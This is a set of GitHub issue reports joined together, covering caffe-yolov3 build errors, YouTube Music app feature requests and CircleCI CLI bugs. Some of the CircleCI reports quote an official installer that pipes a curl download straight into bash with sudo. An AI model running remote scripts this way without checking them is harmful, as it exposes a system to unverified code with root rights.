/home/jane/Files/caffe/include/caffe/blob.hpp:9:34: fatal error: caffe/proto/caffe.pb.h: No such file or directory
compilation terminated.
CMakeFiles/sysDetectSpeed.dir/build.make:107: recipe for target 'CMakeFiles/sysDetectSpeed.dir/box.cpp.o' failed
make[2]: *** [CMakeFiles/sysDetectSpeed.dir/box.cpp.o] Error 1
make[2]: *** Waiting for unfinished jobs....
In file included from /home/jane/Files/caffe/include/caffe/caffe.hpp:7:0,
                 from /home/jane/Files/object_detection/caffe-yolov3/yolo_layer.h:9,
                 from /home/jane/Files/object_detection/caffe-yolov3/yolo_layer.cpp:7:
/home/jane/Files/caffe/include/caffe/blob.hpp:9:34: fatal error: caffe/proto/caffe.pb.h: No such file or directory
compilation terminated.
CMakeFiles/sysDetectSpeed.dir/build.make:155: recipe for target 'CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o' failed
make[2]: *** [CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o] Error 1
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/sysDetectSpeed.dir/all' failed
make[1]: *** [CMakeFiles/sysDetectSpeed.dir/all] Error 2
Makefile:127: recipe for target 'all' failed
make: *** [all] Error 2

could you please help me?
 when I cmake the project, I met this error

In file included from /home/jane/Files/object_detection/caffe-yolov3/box.h:9:0,
                 from /home/jane/Files/object_detection/caffe-yolov3/box.cpp:1:
/home/jane/Files/object_detection/caffe-yolov3/yolo_layer.h:9:27: fatal error: caffe/caffe.hpp: No such file or directory
compilation terminated.
CMakeFiles/sysDetectSpeed.dir/build.make:107: recipe for target 'CMakeFiles/sysDetectSpeed.dir/box.cpp.o' failed
make[2]: *** [CMakeFiles/sysDetectSpeed.dir/box.cpp.o] Error 1
In file included from /home/jane/Files/object_detection/caffe-yolov3/yolo_layer.cpp:7:0:
/home/jane/Files/object_detection/caffe-yolov3/yolo_layer.h:9:27: fatal error: caffe/caffe.hpp: No such file or directory
compilation terminated.
CMakeFiles/sysDetectSpeed.dir/build.make:155: recipe for target 'CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o' failed
make[2]: *** [CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o] Error 1
/home/jane/Files/object_detection/caffe-yolov3/cuda.cpp: In function ‘dim3 cuda_gridsize(size_t)’:
/home/jane/Files/object_detection/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of ‘x’ from ‘size_t {aka long unsigned int}’ to ‘unsigned int’ inside { } [-Wnarrowing]
     dim3 d = {x, y, 1};
                      ^
/home/jane/Files/object_detection/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of ‘y’ from ‘size_t {aka long unsigned int}’ to ‘unsigned int’ inside { } [-Wnarrowing]
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/sysDetectSpeed.dir/all' failed
make[1]: *** [CMakeFiles/sysDetectSpeed.dir/all] Error 2
Makefile:127: recipe for target 'all' failed
make: *** [all] Error 2

could you please help me?
 user@7b114a18e77a:~/daniel_ws/caffe-yolov3-master/model_convert$ python yolov3_darknet2caffe.py yolov3.cfg yolov3.weights yolov3.prototxt yolov3.caffemodel 
  File "yolov3_darknet2caffe.py", line 102
    elif block['type'] == 'upsample':
                                    ^
TabError: inconsistent use of tabs and spaces in indentation
 Hello, I was running darknet2caffe.py when I got stuck in load_conv_bn2caffe and made an error of 'total size of new array must be unchanged'. How should this error be solved? I put the CPP, cu and HPP of upsample into the specified folder of caffe and recompiled caffe. Thank you for your reply! basically, I use "./x86_64/bin/detectnet 0 ../../data/yolov3/prototxt/yolov3.prototxt ../../data/yolov3/caffemodel/yolov3.caffemodel" to inference original yolov3 model for  coco dataset is ok
the dog.jpg have the correct box.
but when I train my dataset and  do inference ,the result is strange .a lot of boxes appear .my dataset only 10 class .
below picture is the test result.
 from cfg import *
from prototxt import *
import failed

where are they from? I run make command and face these problem, I don't know how to fix it.
[ 10%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_max_pool_1d.cu.o
[ 20%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_activation_kernels.cu.o
[ 30%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_blas_kernels.cu.o
Scanning dependencies of target sysDetectSpeed
make[2]: *** No rule to make target '/usr/lib/x86_64-linux-gnu/libgflags.so.2', needed by 'x86_64/lib/libsysDetectSpeed.so'.  Stop.
make[2]: *** Waiting for unfinished jobs....
[ 40%] Building CXX object CMakeFiles/sysDetectSpeed.dir/box.cpp.o
[ 50%] Building CXX object CMakeFiles/sysDetectSpeed.dir/cuda.cpp.o
[ 60%] Building CXX object CMakeFiles/sysDetectSpeed.dir/image.cpp.o
[ 70%] Building CXX object CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o
/home/administrator/caffe-yolov3/cuda.cpp: In function 'dim3 cuda_gridsize(size_t)':
/home/administrator/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of 'x' from  size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
     dim3 d = {x, y, 1};
                      ^
/home/administrator/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of 'y' from  size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/sysDetectSpeed.dir/all' failed
make[1]: *** [CMakeFiles/sysDetectSpeed.dir/all] Error 2
Makefile:129: recipe for target 'all' failed
make: *** [all] Error 2
 [ 40%] Building CXX object CMakeFiles/sysDetectSpeed.dir/box.cpp.o
[ 50%] Building CXX object CMakeFiles/sysDetectSpeed.dir/image.cpp.o
[ 70%] Building CXX object CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o
[ 70%] Building CXX object CMakeFiles/sysDetectSpeed.dir/cuda.cpp.o
/home/user/daniel_ws/caffe-yolov3-master/cuda.cpp: In function 'dim3 cuda_gridsize(size_t)':
/home/user/daniel_ws/caffe-yolov3-master/cuda.cpp:53:22: warning: narrowing conversion of 'x' from 'size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
     dim3 d = {x, y, 1};
                      ^
/home/user/daniel_ws/caffe-yolov3-master/cuda.cpp:53:22: warning: narrowing conversion of 'y' from 'size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/sysDetectSpeed.dir/all' failed
make[1]: *** [CMakeFiles/sysDetectSpeed.dir/all] Error 2
Makefile:129: recipe for target 'all' failed
make: *** [all] Error 2
 Thanks for your help!
When I convert the yolov3-tiny model to caffe model, I got this error.
I saved prototxt successfully but can't convert the weightfile.  

Traceback (most recent call last):
  File "/home/mitc/ljy/darknet2caffe/darknet2caffe.py", line 540, in <module>
    darknet2caffe(cfgfile, weightfile, protofile, caffemodel)
  File "/home/mitc/ljy/darknet2caffe/darknet2caffe.py", line 18, in darknet2caffe
    params = net.params
  File "/home/mitc/ljy/caffe/python/caffe/pycaffe.py", line 67, in _Net_params
    self._layer_names, self.layers)
  File "/home/mitc/ljy/caffe/python/caffe/pycaffe.py", line 68, in <listcomp>
    if len(lr.blobs) > 0])
OverflowError: cannot fit 'int' into an index-sized integer
*** Error in `/home/mitc/ljy/anaconda3/bin/python3.6': free(): invalid pointer: 0x000000000b7ae728 *** make[2]: *** No rule to make target '/usr/lib/x86_64-linux-gnu/libglog.so', needed by 'x86_64/lib/libyolov3-plugin.so'.  Stop.
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/yolov3-plugin.dir/all' failed
make[1]: *** [CMakeFiles/yolov3-plugin.dir/all] Error 2
Makefile:127: recipe for target 'all' failed
make: *** [all] Error 2

<---------->
137696565
Reminder that I need to document the Docker images and multilingual. See https://www.drupal.org/project/tome/issues/3050110 for context Reminder that I need to document the Docker images and multilingual. 
<---------->
137882655
When listening to videos, the YT Music phone app (official) allows audio only, to reduce bandwidth usage.

Would it be possible to add this feature? :) Hi, thanks for this awesome wrapper over YT music.

I often use the [lyricsX](https://github.com/ddddxxx/LyricsX) app for displaying lyrics to the currently playing song. It doesn't work with this app but it supports picking up the song from "Now playing".

Would it be possible to support exposing the current playing song and artist on the "Now playing". I suppose that should fix the problem. Thanks.

Should also resolve #62 When building the app the MediaKeyTap Module is not available in YT Music/Controllers/ViewController + MediaKeys.swift Cant seem to play live music channels. Have tried adding as a playlist, favourited, and added to new playlist. 

Have tried searching for a live music stream, neither options seem to work. Hi, how i can use this app? I come from Vietnam, thanks.
[Imgur](https://i.imgur.com/G2WgJjz.jpg) It would be a fantastic app if the AdBlock extension could be installed.  When app is open then in touchbar timeline is not moving, and play button not changed icon to pause. But if we hide app all works almost fine, almost fine - because we have no buttons previous and next track in touchbar. Most of the times I receive a call or I enter into a Google Hangouts meeting the music starts playing. I don't know if it normally or I have bad config. But when I m on other application in full screen I cannot change music. I have only the duration of music and play/pause.  @steve228uk love the app! Have a request: would it be possible to reduce the minimal window width and height? YT music has a good mobile layout and it would make it a little less large on the desktop. I tried doing it myself by can't get the cocoapods dependencies to resolve properly... When I pause my music and disconnect my airpods it starts playing my music again using my laptop speakers. I'm putting this out there in case it's doable, but that's definitely a "nice to have" feature rather than a "must have" one.

*Context:*
I like to mark songs with "like" or "dislike" or add them to a playlist when discovering new songs. But obviously, I'm not gonna do that at the beginning of a song.

*Feature description:*
About 15 seconds before the end of a song, a notification would remind us the name of the song that's finishing with buttons to:
- like it (closes the notif, registers the like, but doesn't focus on YT Music app)
- add to playlist (closes the notif, focuses on YT Music app)
(dislike button doesn't make sense, since we'd click it sometimes during the song to skip it)
When the song ends:
- if Mac OS allows to edit and ongoing notification content, then put the new song without buttons
- if not, discard notif and show notif of new song (as is today)

*Design:*
If notifications allow for GIFs, loaders or anything of the sort, then we could indicate how long until the song changes.

*Doability:*
- Is there a listener or another way that would allow us to know when we're at 'x' seconds from the end ?
- I know Mac notifications allow for at least two buttons, with one having a context menu. Not sure if we could add the last 2-3 playlists in that menu. When a song is playing and we click 'start radio' the song restarts. It would be nice if the song continued playing. When a song is playing and we click 'start radio' the song restarts. It would be nice if the some continued playing. When searching for something it would be great if we could play the songs in the search results and not have to individually play them. In the web app, I can change the playbackRate using Developer Tools.

```javascript
$('video').playbackRate = 1.75
```

Can you add a setting for *very strange* people that would like to do that in a menubar option?

If you point me in the right direction, I can probably make a PR. Somehow I was signed out.  Now when I try to sign back in I get the browser window with the account list, but it does not respond to any clicks, as if JS is blocked, but I can't seem to overcome that.  When I go to youtube from any of my browsers, my account shows up. I am opening this issue because I think an option to use a proxy on the app would really add more value to use the app over using just the browser.

Google Play Music is not available in many countries yet, so using a proxy is the only option for these places.

I am aware that enabling the proxy system wide would just work but it has downsides. Hi, how i can use this app? I come from Vietnam, thanks.
[Imgur](https://i.imgur.com/G2WgJjz.jpg) I love the app but will we neat to have inbuilt lyrics support.
<---------->
137903064
- [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Request a feature.

**What is the current behavior?**
`circleci config pack` produces an "unknown anchor" error when attempting to define a YAML anchor in one file and alias it in another.

Can you provide an example?

*Example directory structure:*
```
my-orb/src/
├ anchors
│ └ @anchors.yml
└ commands
  └ my-command.yml
```

*@anchors.yml:*
```yaml
my-anchor: &my-anchor my-value
```

*my-command.yml:*
```yaml
description: *my-anchor
```

*running circleci config pack:*
```shell
> circleci config pack src
Error: Failed trying to marshal the tree to YAML : yaml: unknown anchor 'my-anchor' referenced
```

**What is the expected behavior?**

*running circleci config pack:*
```shell
> circleci config pack src
anchors:
  my-anchor: my-value
commands:
  my-command:
    description: my-value
```

**Which version of the CLI and OS are you using? Did this work in previous versions?**
```shell
> circleci version
0.1.5879+416032d
```

I am not aware of a version where this ever worked. - [x ] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x ] I have checked for similar issues and haven't found anything relevant.
- [x ] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Bug

**What is the current behavior?**
Cannot install circleci on ubuntu using curl command. Prefer not to install items with snap. Everything I have installed with snap crashes my Ubuntu

Can you provide an example?
both provied curl commands fail
```
sudo curl -fLSs https://circle.ci/cli | bash
sudo curl -fLSs https://circle.ci/cli | DESTDIR=/opt/bin bash
```

**What is the expected behavior?**
install and work

**Which version of the CLI and OS are you using? Did this work in previous versions?**
Ubuntu 18.04.2 LTS x86_64
Kernel: 4.18.0-17-generic
shell: bash 4.4.19
DE: GNOME 3.28.3
WM: GNOME Shell
Terminal: gnome-terminal


Please provide the output of `circleci version` and `circleci diagnostic`.

With `sudo curl -fLSs https://circle.ci/cli | bash`
```
Starting installation.
Installing CircleCI CLI v0.1.5490
Installing to /usr/local/bin
mv: cannot move 'circleci' to '/usr/local/bin/circleci': Permission denied
An error occured installing the tool.
The contents of the directory /tmp/tmp.Hy1GTtpEgu have been left in place to help to debug the issue.
```
With `sudo curl -fLSs https://circle.ci/cli | DESTDIR=/opt/bin bash`
```
Starting installation.
Installing CircleCI CLI v0.1.5490
Installing to /opt/bin
mv: cannot move 'circleci' to '/opt/bin': Permission denied
An error occured installing the tool.
The contents of the directory /tmp/tmp.6WX9FCJY8J have been left in place to help to debug the issue
```

I am able to cd to `/tmp/tmp.6WX9FCJY8J` and execute `./circleci` and that works. But it says it fails, and is not installed to my bash profile?

 - [X] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [X] I have checked for similar issues and haven't found anything relevant.
- [X] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Bug

**What is the current behavior?**
Running `circleci local execute` results in a `"docker-init": executable file not found` error during the "Spin up Environment" phase:
```
$ minikube version
minikube version: v1.4.0
commit: 7969c25a98a018b94ea87d949350f3271e9d64b6

$ eval $(minikube docker-env)

$ circleci local execute
Docker image digest: sha256:416a81b71713aad8cb82db68637fe3047e9031c4961c1e6a16140f0dff45b8cf
====>> Spin up Environment
Build-agent version 1.0.17052-a0ff09bd (2019-09-30T16:32:40+0000)
Docker Engine Version: 18.09.9
Kernel Version: Linux 38ef40faddbb 4.15.0 #1 SMP Wed Sep 18 07:44:58 PDT 2019 x86_64 Linux
Starting container circleci/python:3.7
  using image circleci/python@sha256:25e42a6d9f3f9f074bdffe119d41935bab8bcca6754c1835cef40a2d35b0969d
Error:
Error response from daemon: exec: "docker-init": executable file not found in $PATH

Step failed
Task failed
Error: Error response from daemon: exec: "docker-init": executable file not found in $PATH
```

I used the following `.circleci/config.yml` file to generate the above error:
```yaml
version: 2
jobs:
  build:
    docker:
      - image: circleci/python:3.7
    working_directory: ~/repo
    steps:
      - checkout
```

**What is the expected behavior?**
The `circleci local execute` command should be able to run in the Docker environment that is provided by [Minikube](https://github.com/kubernetes/minikube).

**Which version of the CLI and OS are you using? Did this work in previous versions?**

```
$ circleci version
0.1.5879+416032d
```

```
$ circleci diagnostic

---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/tjensen/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
Error: please set a token with 'circleci setup'
You can create a new personal API token here:
https://circleci.com/account/api
```

I'm running the CLI on macOS Mojave version 10.14.6.

I used to be able to run the `circleci` CLI with Minikube when I was using version `0.1.4786+bad101f`, but I have since upgraded to the latest version (using `brew upgrade circleci`). I have tried manually reinstalling the older version but it's still failing with the `docker-init` error. I presume it has something to do with the Build-agent but I'm not sure how to force an older version of the agent. I found an old saved log from a working run that showed I was using version `0.1.750-336e0196` of the build agent in Minikube. - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

It's a bug. This applies to both `circleci process` and also to the CircleCI service itself, which I assume is using `circleci process` under the hood.

**What is the current behavior?**

The `circleci process` command converts "folded" multiline YAML string literals into non-folded ones. See https://yaml-multiline.info/ to read about the difference between the two if you're not aware.

For example, consider the following snippet as input:
```yaml
          command: >
            docker build
              -t $AWS_ECR_ACCOUNT_URL_US_EAST_1/<< parameters.image >>
              << parameters.subdir >>
```

Running `circleci process` converts it to the following snippet, which is not semantically the same in how the line breaks are processed:
```yaml
        command: |
          docker build
            -t $AWS_ECR_ACCOUNT_URL_US_EAST_1/cp-api
            cmd/api
```

The result is that a valid YAML multi-line literal that should get folded into a single line is instead treated as multiple lines by the shell executor, seen as three (invalid) shell commands instead of one.

I can work around this by using `|` and adding a `\` on the end of each line in the literal to make the shell executor fold the lines together, but the fact remains that `circleci process` is breaking what would otherwise be a valid YAML representation of what I want to do. Also, the `\` workaround may not work for non-shell semantics.

**What is the expected behavior?**

I expect `circleci process` not to affect the YAML semantics of my string literals at all. I don't mind if it changes the formatting of the YAML markup, as long as the string literals themselves remain identical to what I gave as input.

This means that `circleci process` should either preserve the `>` vs `|` distinction, or alternatively, eagerly fold my folded string literal onto a single line.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

```
$ circleci version
0.1.5546+1fae6c8

$ circleci diagnostic

---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/jemc/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
Error: please set a token with 'circleci setup'
You can create a new personal API token here:
https://circleci.com/account/api
```
 - [+] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [+] I have checked for similar issues and haven't found anything relevant.
- [+] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
*bug*

**What is the current behavior?**
I have a multi-file configuration CircleCI. When I run the command "circleci config pack config", I have the wrong "executors section".

Can you provide an example?
.circleci
├── config 
│   ├── @config.yml
│   └── jobs 
│       └── unit-tests.yml
└── config.yml 

 config/@config.yml contains:
version: 2.1
executors:
  cockroach-executor:
    docker:
      - image: $DOCKER_IMAGE_GOLANG
      - image: $DOCKER_IMAGE_COCKROACH
        command: "start --insecure --store=type=mem,size=50%"
workflows:
  version: 2
  build_n_test:
    jobs:
      - unit-tests:


 config/jobs/unit-tests.yml contains:
executor: cockroach-executor
steps:
  - run:
      name: Unit tests
      command: |
        echo "Unit tests"


then I run "circleci config pack config > config.yml" and get:
config.yml contains:
executors:
  cockroach-executor:
    docker:
    **- image: $DOCKER_IMAGE_GOLANG
    - command: start --insecure --store=type=mem,size=50%
      image: $DOCKER_IMAGE_COCKROACH**
jobs:
  unit-tests:
    executor: cockroach-executor
    steps:
    - run:
        command: |
          echo "Unit tests"
        name: Unit tests
version: 2.1
workflows:
  build_n_test:
    jobs:
    - unit-tests: null
  version: 2


**What is the expected behavior?**
config.yml contains:
executors:
  cockroach-executor:
    docker:
    **- image: $DOCKER_IMAGE_GOLANG
      - image: $DOCKER_IMAGE_COCKROACH
        command: start --insecure --store=type=mem,size=50%**
jobs:
  unit-tests:
    executor: cockroach-executor
    steps:
    - run:
        command: |
          echo "Unit tests"
        name: Unit tests
version: 2.1
workflows:
  build_n_test:
    jobs:
    - unit-tests: null
  version: 2


**Which version of the CLI and OS are you using? Did this work in previous versions?**
CLI version: 0.1.5725+b0a23c0
OS version: Ubuntu 16.04

Please provide the output of `circleci version` and `circleci diagnostic`.

CircleCI CLI Diagnostics

Debugger mode: false
Config found: /home/andy/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
Error: please set a token with 'circleci setup'
You can create a new personal API token here:
https://circleci.com/account/api

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.**
 - [ x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [ x] I have checked for similar issues and haven't found anything relevant. (none of the other missing config solutions worked for me)
- [x ] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

BUG

**What is the current behavior?**

Unable to locally execute circle ci for testing my builds.

Can you provide an example?

```
git clone https://github.com/CircleCI-Public/circleci-demo-go.git
cd circleci-demo-go
circleci local execute --job build
```

Result

```
Docker image digest: sha256:463f8b03fa34e7609792bbc3e8983167fbb1221d9cefb1be401c0952973b3ebb
Error: failed to start event processor: failed to compute task config: failed to read config file: open circle.yml: no such file or directory
```

Config is valid

```
~/circleci-demo-go$ circleci config validate
Config file at .circleci/config.yml is valid.
```

Both docker and circleci are running within my user space without the need of sudo.

**What is the expected behavior?**

When I run the example code from "https://circleci.com/docs/2.0/local-cli/" I expect the config file to be found and that it runs the job.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

Never used a previous version.

- Windows 10 Pro 1903, build 18363.264
- WSL: Linux MSI 4.4.0-18362-Microsoft #1-Microsoft Mon Mar 18 12:02:00 PST 2019 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 18.04
- 32g ram, 64bit, core i7-8750h
- Docker version 18.09.6, build 481bc77

Please provide the output of `circleci version` and `circleci diagnostic`.

`0.1.5725+b0a23c0`

and

```
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/wemeet/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, Kelvin.
```
 - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Report a bug.

**What is the current behavior?**
When trying to validate any config file the following error occurs:

```
Error: Unexpected exception processing config
Please contact support
```

Can you provide an example?

Contents of `.circleci/config.yml`:
```
version: 2
```

Result of validation:
```
$ circleci config validate
Error: Unexpected exception processing config
Please contact support
```

With debug flag:
```
circleci --debug config validate
>> variables: map[config:version: 2
]
>> query:
		query ValidateConfig ($config: String!) {
			buildConfig(configYaml: $config) {
				valid,
				errors { message },
				sourceYaml,
				outputYaml
			}
		}
<< request id: ef5dbc7b-0490-4a62-8baa-c62b16863700
<< result status: 200 OK
<< {"data":{"buildConfig":{"valid":false,"errors":[{"message":"Unexpected exception processing config"},{"message":"Please contact support"}],"sourceYaml":"version: 2\n","outputYaml":"jobs:\n  Build Error:\n    docker:\n    - image: bash:4.4.19\n    steps:\n    - run:\n        name: Config Processing Error (Don't rerun)\n        command: \"# Unexpected exception processing config\\n# Please contact support\\n\\\n          # \\n# -------\\n# Warning: This configuration was auto-generated to show\\\n          \\ you the message above.\\n# Don't rerun this job. Rerunning will have no\\\n          \\ effect.\\nfalse\"\nworkflows:\n  version: 2\n  Build Error:\n    jobs:\n    - Build Error\nversion: 2\n\n# Original config.yml file:\n# version: 2"}}}
Error: Unexpected exception processing config
Please contact support
```

**What is the expected behavior?**

I expect the file to be validated without an exception occuring.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

```
$ circleci version
0.1.5879+416032d
```

```
$ circleci diagnostic
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/<home directory>/.circleci/cli.yml
API host: https://circleci.<domain>.com/
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, michael.browne.
```
(I've removed any sensitive info, the domain and config directory are set correctly)

I'm running macOS Mojave 10.14.6

I've tried installing CircleCI CLI directly and through homebrew, but get the same results either way.

I haven't tried any previous versions on CircleCI CLI

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.** - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Report a bug.

**What is the current behavior?**
When trying to validate any config file the following error occurs:

```
Error: Unexpected exception processing config
Please contact support
```

Can you provide an example?

Contents of `.circleci/config.yml`:
```
version: 2
```

Result of validation:
```
$ circleci config validate
Error: Unexpected exception processing config
Please contact support
```

With debug flag:
```
circleci --debug config validate
>> variables: map[config:version: 2
]
>> query:
		query ValidateConfig ($config: String!) {
			buildConfig(configYaml: $config) {
				valid,
				errors { message },
				sourceYaml,
				outputYaml
			}
		}
<< request id: ef5dbc7b-0490-4a62-8baa-c62b16863700
<< result status: 200 OK
<< {"data":{"buildConfig":{"valid":false,"errors":[{"message":"Unexpected exception processing config"},{"message":"Please contact support"}],"sourceYaml":"version: 2\n","outputYaml":"jobs:\n  Build Error:\n    docker:\n    - image: bash:4.4.19\n    steps:\n    - run:\n        name: Config Processing Error (Don't rerun)\n        command: \"# Unexpected exception processing config\\n# Please contact support\\n\\\n          # \\n# -------\\n# Warning: This configuration was auto-generated to show\\\n          \\ you the message above.\\n# Don't rerun this job. Rerunning will have no\\\n          \\ effect.\\nfalse\"\nworkflows:\n  version: 2\n  Build Error:\n    jobs:\n    - Build Error\nversion: 2\n\n# Original config.yml file:\n# version: 2"}}}
Error: Unexpected exception processing config
Please contact support
```

**What is the expected behavior?**

I expect the file to be validated without an exception occuring.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

```
$ circleci version
0.1.5879+416032d
```

```
$ circleci diagnostic
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/<home directory>/.circleci/cli.yml
API host: https://circleci.<domain>.com/
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, michael.browne.
```
(I've removed any sensitive info, the domain and config directory are set correctly)

I'm running macOS Mojave 10.14.6

I've tried installing CircleCI CLI directly and through homebrew, but get the same results either way.

I haven't tried any previous versions on CircleCI CLI

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.** - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

Bug

**What is the current behavior?**

Running CircleCI jobs locally via CLI fails on the "Checkout code" step if any directory names or filenames in the git repository contain spaces.

Can you provide an example?

```bash
git clone https://github.com/CircleCI-Public/circleci-demo-go.git
cd circleci-demo-go
touch "filename with spaces.txt"
git add "filename with spaces.txt"
git commit -m "add filename with spaces.txt"
circleci local execute --job build
```

Output:

```
Docker image digest: sha256:2467cdef08aa5988c09618d33c0182cc31cf46b5e3be92e65f08447b01c96929
====>> Spin up Environment
Build-agent version 0.1.1578-6ce10866 (2019-02-02T19:43:16+0000)
Starting container circleci/golang:1.8
  using image circleci/golang@sha256:19be339aac6a708434981f4e3a2ee79c45eca9af313c49b156fe021c1b0a0b74
Starting container circleci/postgres:9.6-alpine
  using image circleci/postgres@sha256:a4b18d3e451ac84955cb33c372389a46ce06e46439ec391e168eec9b607114ff
====>> Container circleci/postgres:9.6-alpine
Service containers logs streaming is disabled for local builds
You can manually monitor container 40f0cf214d9c4b674d2c1e5adf0bcabded0a09a19c71d8ce27f5cc6ba2f03548
====>> Checkout code
  #!/bin/bash -eo pipefail
mkdir -p /go/src/github.com/CircleCI-Public/circleci-demo-go && cd /tmp/_circleci_local_build_repo && git ls-files | xargs tar -c | tar -x -C /go/src/github.com/CircleCI-Public/circleci-demo-go
tar: filename: Cannot stat: No such file or directory
tar: with: Cannot stat: No such file or directory
tar: spaces.txt: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors
Error: Exited with code 123
Step failed
```


**What is the expected behavior?**

"Checkout code" step succeeds

**Which version of the CLI and OS are you using? Did this work in previous versions?**

CircleCI: 0.1.5314+26252a9 (installed via `curl -fLSs https://circle.ci/cli | sudo bash`)
OS: Ubuntu 18.04.1 LTS

Have not tried previous versions

Please provide the output of `circleci version` and `circleci diagnostic`.

```
> circleci version
0.1.5314+26252a9
> circleci diagnostic

---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/lachlan/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API... 
Ok.

> docker version
Client:
 Version:	17.12.1-ce
 API version:	1.35
 Go version:	go1.10.1
 Git commit:	7390fc6
 Built:	Wed Apr 18 01:23:11 2018
 OS/Arch:	linux/amd64

Server:
 Engine:
  Version:	18.06.1-ce
  API version:	1.38 (minimum version 1.12)
  Go version:	go1.10.4
  Git commit:	e68fc7a
  Built:	Mon Oct  1 14:25:33 2018
  OS/Arch:	linux/amd64
  Experimental:	false

```

**If you have any questions, feel free to ping us at @CircleCI-Public/dx-clients.**
 # Description
The `circleci` command line tool `config verify` command doesn't seem to do a very thorough job or actually validate against the configuration file schema in the way that the actual build system does.

For example, the following config file passes verification:

```
tyler$ circleci config validate
Config file at .circleci/config.yml is valid.
```

config file:

```
vesion: 2
jobs:
  build: 
    macos:
      xcode: "11.0.0"
    
    steps:
      - checkout
    
      - run:
          name: Build and run tests
          command: fastlane scan
          environment:
            SCAN_DEVICE: iPhone Xʀ (13.0)
            SCAN_SCHEME: test_iOS_NoSwiftUI
        
      - store_test_results:
          path: test_output/report.xml
          
      - store_artifacts:
          path: /tmp/test-results
          destination: scan-test-results
          
      - store_artifacts:
          path: ~/Library/Logs/scan
          destination: scan-logs
```

however "version" is misspelled as "vesion" and gets a warning in the "Configuration" section of the CircleCI dashboard:

```
# -------- WARNING ---------
# Your config does not conform to the schema.
# Violations are listed below:
# 
# ERROR IN CONFIG FILE:
